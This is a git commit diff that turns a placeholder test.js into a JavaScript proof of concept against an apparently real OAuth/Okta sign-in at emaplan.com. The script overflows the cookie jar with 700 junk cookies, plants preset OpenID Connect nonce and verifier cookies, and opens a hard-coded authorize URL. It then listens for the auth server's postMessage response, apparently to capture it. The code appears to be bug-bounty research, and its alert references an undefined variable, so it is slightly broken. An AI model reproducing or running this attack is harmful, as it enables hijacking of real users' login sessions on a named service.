fd81955178b3448b34c612673403bbca0e4628c4
archyxsec <52278758+archyxsec@users.noreply.github.com>
2025-03-03 21:35:40 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,33 @@
-alert(3);
+// PUT HERE YOUR VARS
+
+var loginurl="https://auth.externalbeta2.emaplan.com/oauth2/default/v1/authorize?client_id=0oaedsgzjxZlGjbOX4h7&redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema%2Fauthorization-code%2Fcallback&response_type=code&scope=openid%20profile&code_challenge=WYUd7Rw6Odj8VXoZ2_rSbQfJ_R6amUM3qEnyfAbOkQk&code_challenge_method=S256&state=OpenIdConnect.AuthenticationProperties%3D0DWCvFDnVB692OwpCrX96CboWmAAqRoqDotTJd0Z96elcQdDbm3yZfeKyz1dRXydPgp56_xYaaoJJAXi7m6Xn1iKGnEOBsrUFixzZ0156B1QFhWzhqLEYVam7jKACfTbAzc7A9m7T1e_9U0xTFx-gz7DqaW1qxChvjsRlIfDeqUe5PZ7qt3tDa6H9orjQUzNMCrK8-yTNFOubF7pTGXQn7q2l-x7EPf1mRDf1_fJlQlU_Qur70fKSxlNoM8H35SR5KJtMXWKe8SIkPqndK1NOPylHmX7pk4sq6OlBZPf8IxrRM-Wk7KK_Nc_NfCGDd3-JIdJC4rQwQk-JQ-HKP90xEmJTWrp_sQeyFE9mIYbVi0UeLc67ygEQInxRHO4xhpY4u5AfoEfyPthcCTCzJgkmuXP4N1uUYxwuwMHOYNNvYkNtbWeIRoYOCvtQGML1UvhQHMa8ZWI-OOyy96YdlVAsyugRgBMesCZRAL1IC_lykzvXyr9fa6KkonwVv2jyFEbvgPUEyl0SPSMry539i3ELaYc8LdhuI5Yf4_NAOIn9feosX3P6XVjz36NwYJKm8747nKm8ibvPzT9XMxBfwe4ODVf7J53MTA0_JG-lWMO8KhQm75Y7iNrUovvSFONtQx1FndqoozncJ2xT11Li16RAyQsji5X_GSSnnW2FHu4NG4mB3HVzUphsqtPROFHTOMMdpkKUEn4FzItasxTDerVZVxu22DbmjhEzElspzjjxDsdZAFwAae_GjtfYH1_brh_H4MjWzB-wCVDZCLxvh13CE1DyrhhRJWQjboXywRPBXMHCdciLRfPkLHsLHbORDlC7DstrVhRevTZVFEfLRhMtlxKJ7np8Wz1vR4qF39M64yK4ZcUsMgO9aM_RBM-UcWuHL3DQgJqAtU7Oz5wA_bwHsjplYrRRsOfB6yF0o4thJhd9XyHq3B_DVQXNVHL1ad4QucxHYUJ28b5UndsXbysygkQyesyqCvjgKe63nFAglnUKYYsvKRG-cD9rnpt9eVv_YV0I9Y3KGMjm5D0UY5crsINVWqI9JUly4wRG06Kq1-nlFTp0CUUBwtjfDMRKdQJU7Nj1jSk-APTa7A5esyuOzWK7MAZ5JdIfy-6nWMJc00g1JAs7qk5-cYHmDJV4BJu5DI7SULRRxMzJ9mcWYwUYxj5D_RaGjkA3vXT552j3QMyemcVe3mrSETorgpqTCYPh1URNmOXAY551-lKqJmOXcP976_OQlKSosETo-2j1Br3y463-rRZmEEh644GTHh2tmF_YNo5tdi5qmuJXAxg8hTsTI0zOyJBrGLlLgoARYpY6B_-UP3T_gm3_1VnY39NUTaw4z0872m8McH0hsy0gQTsn0YxJMX_FObswmeydOv3vx7Mxd95n0YamUGVE0xCg0efc-ZpPfxV2oCYPP4_lIYMlnqDDSrMQdOBwCa7DBEuhEE2ysykiOXLY-wJm8m73fdGY9_vc74frPFqbwKuX1Kix6a6wm3GZeCuYgayVmscctc3chcuECcUpMkeWAfbRYaCM-X1QEhkYxUHAbSVgBWo2yoIV6aRjal4EKUMfajZk-pbEZm4EyC4mjvqPdYb47nsy4quUxnCFmMg6WLisg_sY6SY9V6w7vlEMdF9AhHRnmj0uqfm_YK5ZZ_YFmTX3oDzljrXN5DCyvyaVWdybxkwmrIeEB-BMHP3gCsnhfaLCGIYlTzKrSRMbWAnmaXSpiWK-OC8IusrtwRscRCMs0AKt-Twv926x5gAyPi6VyHVWE0lPtNz9PE9O3poNCS0Oh_BdZuMUxvYdcIIoKuId3JElKa9dRMLutcUJOuhpqARnnpnbhgh2r5Fd3AHiwsDyRizzKqbnPw-ZyCZjUqocRbaQNzF3J6GvSxtw_7iaWp1tF8FsEXmJ5r8e-pLpT4iLSWfMg2WK9fc8KE1juHDMYKznUa-JqM60LtxiMlZG6ZeR08pgcvYFrlm7KwOwC46wCvF0E09ItfKrerbTLXWdCFCBSS3wFbbdxztLb3ZTQYJtGKayIXAtjJY1mTWyoTo5xrHWfUp-MkbCaMq3TGiKw&response_mode=okta_post_message&nonce=638766308015934696.YjIxZTNjYTMtY2U4MS00ZTQ2LWEyMmMtN2ZmZjk1Yjk0OGEx&login_hint=H1Client00422&partner=ema&office=ema&logo=partner%2Fdefault%2FFiles%2FImages%2FHeader%2FTopLeftLogo.gif%3Fv%3D1039623088&enable_spi_sso=False&post_logout_redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema&x-client-SKU=ID_NET472&x-client-ver=8.3.0.0";
+var openidnonce="OpenIdConnect.nonce.4D2bmoIdCpCO0O2Axvzb4JrPKWQdSlsLZLTe33Uaqpo==RTRRM1BxbjNYRm5ZSmZVZDBXdHM5MkJGVGdLNWRLRTFsQWoxREdhWGR0c1AwOG42ZG5LVHdidGVFT2U5ZDVnRFBiUWF0dFFUcUFCN1U3cmktWXl2YktoX1FGeGVoVFdzblVPSUdWclFUbXR0U09YcmpPOHZzNWpGRW53YlpwOU9LdTNSSU5nZDZSVzYtdkZOWDB4dmg0ZTZVT2xvcEFzVGdSa0gxc1FLdXVlLTh3MDB1QzhxdkNBTkdCN2JqUmJqVTdXaXkxQ2hDd1lvM19weWRzYmpLWnlzUHQyN3NZQVhaTXlxVTZWX0hidw==;";
+var openIdcv="OpenIdConnect.cv.l1hB1j2TK%2bYV%2fsgSKHIJf%2fQVaJ7vgnYGFMbGRLDVP4A%3d=UkRMdi04N2JzNHZLRlpTdFR2UjZid19PcFpNYy1OaVVUVVAyMy0tYjA3WTIyYmt4Zi1yUC1aeFRNYkR2X053UlJrbjMtQ2dJT1JYNFM4dkNKSkFreVIyT0gyU1h6X1hYUC1naXBFYWYxeFR6MjF2RlhBSkU5bzJEajl2U1VhcDVvSHN4M1pjTVRKMzdLeHRPaGlZYV9B;";
+
+function deleteAllCookies() {
+    for (let i = 0; i < 700; i++) {
+        document.cookie = `cookie${i}=${i}; Secure`;
+    }
+
+    for (let i = 0; i < 700; i++) {
+        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
+    }
+}
+
+function executePoC(){
+    var x = window.open(loginurl);
+    window.addEventListener('message',(e)=>{
+        if (e.origin === "https://auth.externalbeta2.emaplan.com"){
+            alert(JSON.stringify(data));
+        }        
+    });
+}
+
+function setCookies(){
+    document.cookie=`${openidnonce}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`
+    document.cookie=`${openIdcv}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`;
+}
+
+deleteAllCookies();
+setCookies();
+executePoC();
